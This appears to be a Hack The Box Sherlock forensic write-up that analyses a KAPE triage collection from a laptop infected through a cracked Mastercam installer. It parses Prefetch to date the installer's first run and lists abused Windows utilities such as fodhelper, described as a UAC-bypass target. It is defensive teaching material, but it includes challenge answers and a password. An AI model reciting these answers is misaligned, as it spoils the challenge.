---
link: https://app.hackthebox.com/sherlocks/CAMouflage
difficulty: Easy
team: blue
release date: 2026-05-28
tags:
image: https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/a1c56189-c2c1-418c-877c-453904ced993-1778691170.png
solved: true
solve date: 2026-09-16
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">CAMouflage Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/a1c56189-c2c1-418c-877c-453904ced993-1778691170.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/1396367">M4shl3</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 16 Sep 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Sherlock Scenario

A newly launched campaign has been detected targeting multiple users utilizing cracked applications. We received an alert indicating unusual behavior from one of our user’s laptops and performed an initial triage. Your task is to conduct a deep dive investigation to determine the root cause and extent of the incident.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Triage & Initial Analysis

### 0.1 Extract the evidence archive

**Why this step**

The Sherlock ships as a single password-protected ZIP. Nothing can be parsed until both layers are unpacked, and the inner archive name carries a collection timestamp that bounds the whole investigation.

**Command**

```bash
7z x CAMouflage.zip -phacktheblue
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `7z` | 7-Zip command-line binary | The archive tool that handles ZIP, 7z, CAB and more |
| `x` | Extract with full paths | Unpacks while preserving the folder structure inside |
| `CAMouflage.zip` | Target archive | The file downloaded from HTB |
| `-phacktheblue` | Password switch | `-p` with the password glued directly to it — HTB uses `hacktheblue` for every Sherlock |

**Result**

```
Everything is Ok

Size:       50191925
Compressed: 50192159
```

Directory contents after extraction:

```
2025-06-21T205150_output.zip  CAMouflage.zip
```

**What this gives you**

Key finding: the inner archive is named `2025-06-21T205150_output.zip`, a collection timestamp of **2025-06-21 20:51:50**. Treat that as the upper bound of the investigation window. No artifact in this dataset post-dates it.

**Next**

Unpack the inner archive to establish which forensic artifact categories the collection contains.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 0.2 Unpack the inner collection and identify the acquisition tool

**Why this step**

The outer archive yielded a second ZIP rather than artifacts. Extracting it reveals both the acquisition tooling used and the artifact scope available for the rest of the investigation.

**Command**

```bash
7z x 2025-06-21T205150_output.zip -oevidence && ls -la evidence
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `7z x` | Extract with full paths | Preserves the collection's original directory tree |
| `2025-06-21T205150_output.zip` | Target archive | The inner archive produced by step 1.1 |
| `-oevidence` | Output directory switch | `-o` glued to the destination name — sends output into `evidence/` instead of the current directory |
| `&&` | Conditional chain | Runs the listing only if extraction succeeded |
| `ls -la evidence` | Long listing, including hidden entries | Shows what landed at the top level of the collection |

**Result**

```
Comment = Created by KAPE version 1.3.0.2 on 2025-06-21T20:51:50.9968970Z

Everything is Ok

Folders: 46
Files: 663
Size:       395529820
Compressed: 50191925
```

```
total 260
drwxrwxr-x 3 nedmoeca nedmoeca   4096 Sep 16 06:39 .
drwxrwxr-x 3 nedmoeca nedmoeca   4096 Sep 16 06:39 ..
-rw-rw-r-- 1 nedmoeca nedmoeca 240679 Jun 21  2025 2025-06-21T20_51_50_9968970_CopyLog.csv
-rw-rw-r-- 1 nedmoeca nedmoeca  11328 Jun 21  2025 2025-06-21T20_51_50_9968970_SkipLog.csv.csv
drwxrwxr-x 7 nedmoeca nedmoeca   4096 Sep 16 06:39 C
```

**Theory — what a KAPE collection is**

KAPE (Kroll Artifact Parser and Extractor) is a triage tool. Rather than imaging an entire disk, it copies a curated set of high-value forensic files off a live Windows host — registry hives, Prefetch, event logs, the `$MFT` and `$J` USN journal, browser history, SRUM and BAM databases — and writes them into a folder tree that mirrors their original paths. That mirroring is why the top level here is a bare `C` directory: every file underneath sits at the same path it occupied on the victim's `C:\` drive.

Two logs accompany every collection. `CopyLog.csv` records each file KAPE successfully copied, with its source path, size and timestamps. `SkipLog.csv` records files KAPE deliberately skipped, usually zero-byte files or ones already collected. Both are investigative assets in their own right — the CopyLog is a searchable inventory of the entire collection, which makes it a faster way to locate a filename than walking the tree.

**What this gives you**

Key finding: the evidence is a **KAPE 1.3.0.2 triage collection** taken **2025-06-21T20:51:50.9968970Z**, containing **663 files across 46 folders** totalling roughly **395 MB uncompressed**.

Note what this is *not*: there is no memory image and no disk image. Every answer must come from on-disk artifacts — execution evidence (Prefetch, SRUM, BAM, Amcache), filesystem metadata (`$MFT`, `$J`), registry hives, and event logs. Questions phrased around "in memory" therefore resolve to strings recoverable from dropped files on disk, not from a RAM capture.

**Next**

Map the collection's directory tree to confirm which artifact categories are present before targeting any single one.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 0.3 Map the collection tree and scope the available artifacts

**Why this step**

KAPE mirrors original Windows paths, so the directory tree is itself an artifact inventory. Knowing which categories exist — and which do not — determines every technique available for the ten tasks and rules out approaches that have no supporting evidence.

**Command**

```bash
find evidence/C -maxdepth 4 -type d | sort
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `find` | Recursive filesystem walker | Walks the tree and prints what matches |
| `evidence/C` | Search root | The mirrored `C:\` drive of the victim host |
| `-maxdepth 4` | Depth limit | Stops four levels down so the output stays readable instead of listing all 663 files |
| `-type d` | Directories only | Shows structure, not contents |
| `\| sort` | Alphabetical ordering | Groups related paths together so categories are obvious |

**Result**

```
evidence/C
evidence/C/$Extend
evidence/C/$Extend/$RmMetadata
evidence/C/$Extend/$RmMetadata/$TxfLog
evidence/C/$Recycle.Bin
evidence/C/$Recycle.Bin/S-1-5-21-1403634729-3147206146-238420168-500
evidence/C/ProgramData
evidence/C/ProgramData/Microsoft
evidence/C/ProgramData/Microsoft/Windows
evidence/C/ProgramData/Microsoft/Windows/Start Menu
evidence/C/Users
evidence/C/Users/Administrator
evidence/C/Users/Administrator/AppData
evidence/C/Users/Administrator/AppData/Local
evidence/C/Users/Administrator/AppData/LocalLow
evidence/C/Users/Administrator/AppData/Roaming
evidence/C/Users/Administrator/Desktop
evidence/C/Users/Default
evidence/C/Users/Default/AppData
evidence/C/Users/Default/AppData/Roaming
evidence/C/Users/Public
evidence/C/Users/Public/Desktop
evidence/C/Windows
evidence/C/Windows/AppCompat
evidence/C/Windows/AppCompat/Programs
evidence/C/Windows/prefetch
evidence/C/Windows/ServiceProfiles
evidence/C/Windows/ServiceProfiles/LocalService
evidence/C/Windows/ServiceProfiles/NetworkService
evidence/C/Windows/System32
evidence/C/Windows/System32/config
evidence/C/Windows/System32/config/systemprofile
evidence/C/Windows/System32/SRU
evidence/C/Windows/System32/Tasks
evidence/C/Windows/System32/Tasks/Microsoft
evidence/C/Windows/System32/winevt
evidence/C/Windows/System32/winevt/logs
```

**Theory — reading a KAPE tree as an artifact inventory**

Each directory in a KAPE collection is shorthand for a specific forensic capability. Learn to translate the tree on sight:

| Path | Artifact | What it answers | Simple Explanation |
| --- | --- | --- | --- |
| `C/$Extend` | `$J` USN Journal | Every file create, rename, write and delete, with timestamps | A change log the filesystem keeps of everything that happened to every file |
| `C/` (root) | `$MFT` | Metadata for every file on the volume, including deleted entries | The master index card catalogue of the disk |
| `C/Windows/prefetch` | `.pf` files | Which executables ran, when, how often, and what they loaded | Windows' own performance cache that accidentally doubles as an execution log |
| `C/Windows/AppCompat/Programs` | `Amcache.hve` | Executable paths, SHA-1 hashes, first-seen times | A registry hive recording binaries the system has encountered |
| `C/Windows/System32/SRU` | `SRUDB.dat` | Per-process network bytes sent/received, per user | The System Resource Usage Monitor — proves a process talked to the network |
| `C/Windows/System32/config` | `SYSTEM`, `SOFTWARE`, `SAM` hives | Services, BAM/DAM execution records, installed software | Core registry — BAM lives in `SYSTEM` and records last execution per user |
| `C/Windows/System32/Tasks` | Scheduled task XML | Persistence via the task scheduler | Jobs Windows was told to run automatically |
| `C/Windows/System32/winevt/logs` | `.evtx` event logs | Process creation, PowerShell, service installs, DNS queries | Windows' built-in audit trail |
| `C/Users/Administrator/AppData` | `NTUSER.DAT`, browser data, roaming payloads | User-scoped activity, download history, dropped files | Where per-user settings and most malware staging lives |
| `C/$Recycle.Bin/S-1-5-21-…-500` | `$I`/`$R` pairs | Files deleted by that user | Deleted-file recovery, with original path and delete time |

**What this gives you**

Key finding: the collection covers **execution artifacts** (Prefetch, Amcache, BAM via `SYSTEM`, SRUM), **filesystem history** (`$MFT`, `$J`), **registry**, **scheduled tasks**, **event logs** and the **Recycle Bin** — the complete standard triage set for reconstructing a malware execution timeline.

Note the single meaningful user profile: `Administrator`, SID `S-1-5-21-1403634729-3147206146-238420168-500`. The `-500` relative identifier marks the built-in local administrator account, so the malware executed with full local privileges and no escalation step is required anywhere in this chain.

Record the negative findings explicitly, since they close off techniques:

| Absent artifact | Consequence |
| --- | --- |
| No memory image (`.raw`, `.mem`, `.dmp`) | Questions worded around "in memory" must be answered from strings inside files recovered on disk |
| No packet capture (`.pcap`, `.pcapng`) | The C2 domain must come from DNS-related event logs, the DNS cache, or the payload's own configuration — not from traffic analysis |
| No full disk image | Only files KAPE targeted exist; anything outside its targets is recoverable as metadata only, via `$MFT` and `$J` |

**Next**

Pivot to execution artifacts to establish the installer's identity and first-run time, starting with Prefetch — the artifact that records executable launches with the precision Task 1 demands.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1
### Based on forensic artifacts, at what precise timestamp did the user first execute the Cracked App installer?

==Answer== `2025-06-21 18:34:19`
<div align="center">
<br>
<br>
</div>

### 1.1 Enumerate the Prefetch directory and identify the installer

**Why this step**

Section 0.3 confirmed `C/Windows/prefetch` is populated. Prefetch is the artifact purpose-built to answer "when did this executable run" — Windows writes a `.pf` file the first time a program launches and updates it on every subsequent run, retaining the last eight execution timestamps and a cumulative run counter. Listing the directory identifies the installer by name before any parsing begins.

**Command**

```bash
ls evidence/C/Windows/prefetch/ | wc -l && ls evidence/C/Windows/prefetch/
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `ls evidence/C/Windows/prefetch/` | List directory contents | Shows every `.pf` file collected |
| `\| wc -l` | Count lines | Gives the total number of prefetch entries at a glance |
| `&&` | Conditional chain | Runs the full listing only if the count succeeded |

**Theory — how Prefetch filenames are built**

A prefetch filename has three parts: the executable's name in uppercase, a hyphen, and an eight-character hexadecimal hash, followed by `.pf`. So `NOTEPAD.EXE-D8414F97.pf` means `notepad.exe` ran from a path whose hash is `D8414F97`.

That hash is computed from the **full path** the executable ran from, not its contents. Two consequences matter for an investigation. First, the same binary launched from two different directories produces two different `.pf` files — which is why the listing below shows nine `SETUP.EXE-*.pf` entries and fifteen `SVCHOST.EXE-*.pf` entries. Second, the filename is truncated to 29 characters before the hash, so long executable names are cut off mid-word.

Prefetch is enabled by default on Windows workstations and disabled by default on servers and on SSD-backed systems in some configurations. Its presence here means the host is a workstation-class Windows build, and that execution evidence should be reliable.

**Result**

```
178
 7Z2407-X64.EXE-68D141D4.pf                   MSCORSVW.EXE-8CE1A322.pf                  SVCHOST.EXE-4E8E9E20.pf
 7ZA.EXE-FA857BD3.pf                          MSEDGE.EXE-37D25F9A.pf                    SVCHOST.EXE-508F55FA.pf
 7ZG.EXE-F49B3D46.pf                          MSEDGE.EXE-37D25F9B.pf                    SVCHOST.EXE-5D15888E.pf
 APPLICATIONFRAMEHOST.EXE-8CE9A1EE.pf         MSEDGE.EXE-37D25F9C.pf                    SVCHOST.EXE-67EC2DA7.pf
 ATTRIB.EXE-8E9FC84B.pf                       MSEDGE.EXE-37D25F9D.pf                    SVCHOST.EXE-6A249820.pf
 AUDIODG.EXE-AB22E9A6.pf                      MSEDGE.EXE-37D25F9E.pf                    SVCHOST.EXE-6E1A6101.pf
 AUTORUN.EXE-46F6E815.pf                      MSEDGE.EXE-37D25FA2.pf                    SVCHOST.EXE-7C364D53.pf
 BACKGROUNDTASKHOST.EXE-332B0729.pf           MSIEXEC.EXE-8FFB1633.pf                   SVCHOST.EXE-8E6D2394.pf
 BACKGROUNDTASKHOST.EXE-B3B8A3A8.pf           MSIEXEC.EXE-CDBFC0F7.pf                   SVCHOST.EXE-93307742.pf
 BACKGROUNDTRANSFERHOST.EXE-4A3D3F52.pf       NGEN.EXE-4A8DA13E.pf                      SVCHOST.EXE-A87523EE.pf
 CERTUTIL.EXE-28F1E0C1.pf                     NGEN.EXE-734C6620.pf                      SVCHOST.EXE-BF3D5CA5.pf
 CHOICE.EXE-42DD1650.pf                       NGENTASK.EXE-0E6CEC17.pf                  SVCHOST.EXE-D1834105.pf
 CLIPUP.EXE-4C5C7B66.pf                       NGENTASK.EXE-849BFD75.pf                  SVCHOST.EXE-DAF72364.pf
 CMD.EXE-0BD30981.pf                          NHCOLOR.EXE-D29DDD9E.pf                   SVCHOST.EXE-DF144105.pf
 CMD.EXE-6D6290C5.pf                          NSUDOLG.EXE-A3333FF9.pf                   SVCHOST.EXE-FDC3FC8E.pf
 COMPATTELRUNNER.EXE-B7A68ECC.pf              PHOTOSAPP.EXE-77E28E93.pf                 SYSTEMSETTINGS.EXE-BE0858C5.pf
 COMREG.EXE-B18E07FD.pf                       POQEXEC.EXE-567EE1A6.pf                   TASKHOSTW.EXE-2E5D4B75.pf
 CONHOST.EXE-0C6456FB.pf                      POWERSHELL.EXE-CA1AE517.pf                TASKKILL.EXE-BE180FC8.pf
 DASHOST.EXE-4B84F273.pf                      REG.EXE-A93A1343.pf                       TASKLIST.EXE-4641012C.pf
 DEFRAG.EXE-3D9E8D72.pf                       RUNDLL32.EXE-164E24E7.pf                  TASKLIST.EXE-F58BCF08.pf
 DEVICECENSUS.EXE-9742347A.pf                 RUNDLL32.EXE-464836ED.pf                  TEXTINPUTHOST.EXE-692EC7E8.pf
 DLLHOST.EXE-15CDDA9C.pf                      RUNDLL32.EXE-52A71BD0.pf                  TIMEOUT.EXE-7D53A680.pf
 DLLHOST.EXE-3D723117.pf                      RUNDLL32.EXE-BF72C764.pf                  TIWORKER.EXE-5595B557.pf
 DLLHOST.EXE-4427C062.pf                      RUNDLL32.EXE-FDCBB5A1.pf                  TOOLBOX.UPDATER.X64.EXE-1A2E871E.pf
 DLLHOST.EXE-4B6CB38A.pf                      RUNTIMEBROKER.EXE-1540E99E.pf             TRUSTEDINSTALLER.EXE-766EFF52.pf
 DLLHOST.EXE-A010D183.pf                      RUNTIMEBROKER.EXE-285799BB.pf             UPFC.EXE-89D4FAEB.pf
 DLLHOST.EXE-C60C3853.pf                      RUNTIMEBROKER.EXE-4551A062.pf             USEROOBEBROKER.EXE-65584ADF.pf
 DLLHOST.EXE-E9BDD97B.pf                      RUNTIMEBROKER.EXE-94B34D1F.pf             USOCLIENT.EXE-4ADC110B.pf
'DOWNLOAD MASTERCAM X9 FULL CR-C7EFFD46.pf'   RUNTIMEBROKER.EXE-98D996D0.pf             VC_REDIST.X64.EXE-1196B2A9.pf
 DRVINST.EXE-39D9EAC7.pf                      RUNTIMEBROKER.EXE-9C74C114.pf             VCREDIST_X64.EXE-4242C1ED.pf
 DSMUSERTASK.EXE-853A6893.pf                  RUNTIMEBROKER.EXE-ADD5E1C9.pf             VC_REDIST.X64.EXE-751F67F2.pf
 ELEVATION_SERVICE.EXE-C2AE4889.pf            RUNTIMEBROKER.EXE-B011FC3A.pf             VCREDIST_X64.EXE-85D50F23.pf
 ELEVATION_SERVICE.EXE-C6B45366.pf            RUNTIMEBROKER.EXE-BD73E83F.pf             VCREDIST_X64.EXE-B0948C06.pf
 EXTRAC32.EXE-4FD3FA35.pf                     SDIAGNHOST.EXE-B3171AA1.pf                VCREDIST_X86.EXE-11EBACBC.pf
 FCLIP.EXE-D93B257B.pf                        SEARCHAPP.EXE-03FE5603.pf                 VCREDIST_X86.EXE-33D31971.pf
 FIND.EXE-AE190082.pf                         SEARCHFILTERHOST.EXE-44162447.pf          VCREDIST_X86.EXE-555EDEE6.pf
 FINDSTR.EXE-1BC2295F.pf                      SEARCHINDEXER.EXE-1CF42BC6.pf             VC_REDIST.X86.EXE-71FE88B0.pf
 FINDSTR.EXE-5986D423.pf                      SEARCHPROTOCOLHOST.EXE-69C456C3.pf        VC_REDIST.X86.EXE-889ABE8F.pf
 FODHELPER.EXE-7F1ED892.pf                    SETUP64.EXE-6C6157AB.pf                   VERCLSID.EXE-AB0FD091.pf
 FORFILES.EXE-1BD2A15F.pf                     SETUP.EXE-20FBC490.pf                     VGAUTHSERVICE.EXE-779D9D39.pf
 IDENTITY_HELPER.EXE-24F367DC.pf              SETUP.EXE-20FBC494.pf                     VM3DSERVICE.EXE-F9D7A5D4.pf
 IDENTITY_HELPER.EXE-5D511889.pf              SETUP.EXE-61F01051.pf                     VMTOOLSD.EXE-90328040.pf
 IPCONFIG.EXE-BFEC2AD0.pf                     SETUP.EXE-94DD5C6C.pf                     VMWARERESOLUTIONSET.EXE-38A925F2.pf
 LOGONUI.EXE-F639BD7E.pf                      SETUP.EXE-94DD5C70.pf                     VSSVC.EXE-6C8F0C66.pf
 MICROSOFTEDGESETUP.EXE-DB91D547.pf           SETUP.EXE-B7C25FBF.pf                     WAASMEDICAGENT.EXE-F5A0D296.pf
 MICROSOFTEDGEUPDATECOMREGISTE-FBD0CE54.pf    SETUP.EXE-C58FE435.pf                     WERMGR.EXE-BE3A79B5.pf
 MICROSOFTEDGEUPDATE.EXE-65B3E8E4.pf          SETUP.EXE-C58FE439.pf                     WGET.EXE-D873B866.pf
 MICROSOFTEDGEUPDATE.EXE-7A595326.pf          SETUP.EXE-FDED94E2.pf                     WHERE.EXE-8DCB25CC.pf
 MICROSOFTEDGEUPDATE.EXE-B00483E4.pf          SETUP.EXE-FDED94E6.pf                     WINSAT.EXE-C345C80B.pf
 MICROSOFTEDGEUPDATESETUP_X86_-878558A0.pf    SGRMBROKER.EXE-32481FEB.pf                WLRMDR.EXE-A7C36FDD.pf
 MICROSOFTEDGE_X64_131.0.2903.-C51766DA.pf    SHELLEXPERIENCEHOST.EXE-AA63A567.pf       WMIADAP.EXE-BB21CD77.pf
 MICROSOFTEDGE_X64_132.0.2957.-4349C6E9.pf    SHUTDOWN.EXE-1692B741.pf                  WMIAPSRV.EXE-FC8436DD.pf
 MICROSOFTEDGE_X64_137.0.3296.-DA18E2E8.pf    SIHCLIENT.EXE-98C47F6C.pf                 WMIC.EXE-98223A30.pf
 MICROSOFTEDGE_X64_137.0.3296.-FC4E20BC.pf    SLUI.EXE-3E441AEE.pf                      WMIPRVSE.EXE-E8B8DD29.pf
 MICROSOFT_PHOTOS_INSTALLER.EX-5CD3389E.pf    SPPEXTCOMOBJ.EXE-7D45A1AB.pf              WOWREG32.EXE-CC9C92C1.pf
 MOBSYNC.EXE-B307E1CC.pf                      SPPSVC.EXE-96070FE0.pf                    WSCRIPT.EXE-3FF4D889.pf
 MODE.COM-A72A4197.pf                         STARTMENUEXPERIENCEHOST.EXE-21AC1B45.pf   WUAUCLT.EXE-5D573F0E.pf
 MOSCOW.COM-34B22CCB.pf                       SVCHOST.EXE-38C6A0A6.pf                   WUSA.EXE-BC40B6DD.pf
 MOUSOCOREWORKER.EXE-4429AC2B.pf              SVCHOST.EXE-4135F405.pf
 MSCORSVW.EXE-16B291C4.pf
```

**What this gives you**

Key finding: `DOWNLOAD MASTERCAM X9 FULL CR-C7EFFD46.pf` is the installer named in the scenario. The filename is truncated at 29 characters — the real executable name continues past `CR`, most likely `CRACK` or `CRACKED`, and the full name must be recovered from inside the `.pf` file itself or from the `$MFT`.

Separate the remaining 177 entries into three buckets:

| Bucket | Representative entries | Analysis | Simple Explanation |
| --- | --- | --- | --- |
| Operating-system noise | `SVCHOST.EXE` (×15), `RUNTIMEBROKER.EXE` (×9), `DLLHOST.EXE` (×7), `TIWORKER.EXE`, `WAASMEDICAGENT.EXE`, `SEARCHINDEXER.EXE` | Expected on any live Windows host; ignore | Normal background Windows machinery |
| Benign installation activity | `MSEDGE.EXE`, `MICROSOFTEDGEUPDATE.EXE`, `VC_REDIST.*`, `VCREDIST_*`, `SETUP.EXE` (×9), `NGEN.EXE` | Browser updates and Visual C++ runtime installs, consistent with routine software setup | Ordinary program installs and updates |
| Living-off-the-land binaries | `EXTRAC32.EXE`, `CERTUTIL.EXE`, `ATTRIB.EXE`, `CHOICE.EXE`, `FINDSTR.EXE` (×2), `FIND.EXE`, `TASKLIST.EXE` (×2), `TASKKILL.EXE`, `FORFILES.EXE`, `TIMEOUT.EXE`, `WHERE.EXE`, `MODE.COM`, `REG.EXE`, `WMIC.EXE`, `WSCRIPT.EXE`, `FODHELPER.EXE`, `CMD.EXE` (×2), `POWERSHELL.EXE` | Signed Microsoft utilities abusable for extraction, enumeration, evasion and persistence — the signature of a batch-driven infection chain | Built-in Windows tools that malware borrows so it never has to bring its own |

Flag these non-standard executables for follow-up; none ships with Windows:

| Entry | Why it stands out |
| --- | --- |
| `MOSCOW.COM-34B22CCB.pf` | A `.com` extension on a modern Windows host is anomalous; the name matches no legitimate product |
| `FCLIP.EXE-D93B257B.pf` | Unrecognised binary |
| `NHCOLOR.EXE-D29DDD9E.pf` | Unrecognised binary |
| `AUTORUN.EXE-46F6E815.pf` | Generic autorun stub, common in installer bundles |
| `NSUDOLG.EXE-A3333FF9.pf` | NSudo variant — a privilege-elevation utility with no legitimate place on a user workstation |
| `COMREG.EXE-B18E07FD.pf` | COM registration helper, frequently bundled with cracks |
| `TOOLBOX.UPDATER.X64.EXE-1A2E871E.pf` | Vendor-agnostic "updater" naming, a common masquerade |
| `7Z2407-X64.EXE`, `7ZA.EXE`, `7ZG.EXE` | 7-Zip, plausibly dropped by the installer to unpack staged components |
| `WGET.EXE-D873B866.pf` | Not a Windows binary; indicates a file-download capability was staged locally |

Note the presence of `FODHELPER.EXE`, which is the canonical Windows UAC-bypass target. Its execution alongside `NSUDOLG.EXE` suggests deliberate elevation activity even though the account is already the built-in Administrator.

**Next**

Parse the installer's `.pf` file to recover its full executable name, run count and execution timestamps.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Parse the installer's Prefetch file for its full name and run times

**Why this step**

The directory listing in 1.1 truncated the installer's name at 29 characters and revealed nothing about when it ran. Parsing the `.pf` file itself recovers the untruncated filename, the full execution path, the run count, and the retained execution timestamps — everything Task 1 requires.

**Command**

```bash
sudo apt install -y libscca-utils
sccainfo "evidence/C/Windows/prefetch/DOWNLOAD MASTERCAM X9 FULL CR-C7EFFD46.pf"
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `apt install -y libscca-utils` | Install the libscca command-line tools | Adds a native Linux parser for Windows Prefetch; `-y` accepts prompts automatically |
| `sccainfo` | libscca's prefetch inspector | Prints every field of a `.pf` file in readable form |
| `"…CR-C7EFFD46.pf"` | Target file, quoted | Quoting is mandatory — the filename contains spaces |

**Theory — why libscca instead of PECmd**

The standard tool for this job is Eric Zimmerman's `PECmd.exe`, a Windows binary. Windows 10 and 11 compress prefetch files with the MAM (Xpress Huffman) algorithm, so a naive parser sees only compressed bytes and fails. `libscca` implements that decompression natively and ships in the Kali repositories, which keeps the entire analysis on Linux with no Wine layer and no .NET runtime. It reads format versions 17 through 30, covering Windows XP through Windows 11.

**Theory — what Prefetch actually records, and its limits**

When a program launches, the Windows Cache Manager monitors the first ten seconds of execution and records every file and directory the process touched, so subsequent launches can pre-load them. The resulting `.pf` file contains:

| Field | Meaning | Forensic value |
| --- | --- | --- |
| Executable filename | The binary's name, untruncated | Recovers the full name the directory listing cut off |
| Run count | Total number of executions since the `.pf` was created | Tells you whether the retained timestamps cover the program's whole history |
| Last run times 1–8 | The eight most recent execution start times, newest first | Direct execution timeline |
| Filenames list | Up to ~1000 files referenced during the first ten seconds | Reveals DLLs, dropped files, temp artifacts and child processes |
| Volume information | Device path, serial number, creation time | Ties the activity to a specific volume |

The critical limitation: only **eight** timestamps are retained. When the run count exceeds eight, the earliest listed time is not the first execution — it is merely the eighth-most-recent. In that situation first-execution evidence must come from elsewhere, typically the `.pf` file's own creation timestamp in the `$MFT`, or from Amcache.

Note also that these times are stored in UTC, and that entry `Last run time: 1` is the most recent execution, not the oldest.

**Result**

```
sccainfo 20250915

Windows Prefetch File (PF) information:
        Format version                  : 30
        Prefetch hash                   : 0xc7effd46
        Executable filename             : DOWNLOAD MASTERCAM X9 FULL CR
        Run count                       : 2
        Last run time: 1                : Jun 21, 2025 18:35:47.481158100 UTC
        Last run time: 2                : Jun 21, 2025 18:34:19.262602400 UTC
        Last run time: 3                : Not set (0)
        Last run time: 4                : Not set (0)
        Last run time: 5                : Not set (0)
        Last run time: 6                : Not set (0)
        Last run time: 7                : Not set (0)
        Last run time: 8                : Not set (0)

Filenames:
        Number of filenames             : 108
```

```
Volumes:
        Number of volumes               : 1

Volume: 1 information:
        Device path                     : \VOLUME{01db6e3ba9900280-9ea9af27}
        Creation time                   : Jan 24, 2025 08:40:46.447475200 UTC
        Serial number                   : 0x9ea9af27
```

The loaded-file list contains 108 entries, the majority of which are standard `SysWOW64` runtime DLLs with no investigative value. The significant entries are reproduced below; the remainder are omitted as system noise, not because they were absent.

```
Filename: 11   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\DOWNLOADS\DOWNLOAD MASTERCAM X9 FULL CRACK PC.EXE
Filename: 69   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\MYSQL.WP5
Filename: 70   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\AUTHORIZATION.WP5
Filename: 71   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\LOCK.WP5
Filename: 72   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\ART.WP5
Filename: 73   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\ROMANIA.WP5
Filename: 74   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\PLAY.WP5
Filename: 75   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\REFUGEES.WP5
Filename: 76   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\RUNNER.WP5
Filename: 77   : \VOLUME{01db6e3ba9900280-9ea9af27}\USERS\ADMINISTRATOR\APPDATA\LOCAL\TEMP\GBA.WP5
Filename: 93   : \VOLUME{01db6e3ba9900280-9ea9af27}\WINDOWS\SYSWOW64\CMD.EXE
Filename: 94   : \VOLUME{01db6e3ba9900280-9ea9af27}\WINDOWS\SYSTEM32\EN-US\CMD.EXE.MUI
Filename: 35   : \VOLUME{01db6e3ba9900280-9ea9af27}\$MFT
```

**What this gives you**

Key finding: the installer's full name and path is `C:\Users\Administrator\Downloads\DOWNLOAD MASTERCAM X9 FULL CRACK PC.EXE`, and it executed **twice** — at **2025-06-21 18:34:19.262 UTC** and again at **2025-06-21 18:35:47.481 UTC**.

Because the run count is 2 and Prefetch retains up to 8 timestamps, both executions are fully represented. The earlier of the two is therefore the genuine first execution, with no risk of the eight-slot rollover described above. Record `2025-06-21 18:34:19 UTC` as the first-execution time; the two runs are 88 seconds apart, consistent with an installer that ran, exited, and was immediately re-launched.

Extract three further facts for later use:

| Observation | Interpretation | Simple Explanation |
| --- | --- | --- |
| Entry 93 loads `SysWOW64\CMD.EXE` | The 32-bit installer spawned a command interpreter within its first ten seconds | The program opened a Command Prompt to run script commands for it |
| Entries 69–77 write nine `.WP5` files to `%LOCALAPPDATA%\Temp` | Payload components staged under an innocuous, unrelated extension — `MYSQL`, `AUTHORIZATION`, `LOCK`, `ART`, `ROMANIA`, `PLAY`, `REFUGEES`, `RUNNER`, `GBA` | The installer scattered nine oddly-named pieces into the temp folder |
| Binary runs from `SysWOW64`, referencing `WOW64.DLL` and `WOW64CPU.DLL` | The installer is a 32-bit executable on a 64-bit host | Built as 32-bit, so Windows ran it through its compatibility layer |

The volume identity is `\VOLUME{01db6e3ba9900280-9ea9af27}`, serial `0x9ea9af27`, created 2025-01-24 — use it to correlate paths across `$MFT`, `$J` and other prefetch files.

**Next**

Establish when the installer process ended, which Prefetch cannot answer — it records start times only.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 2
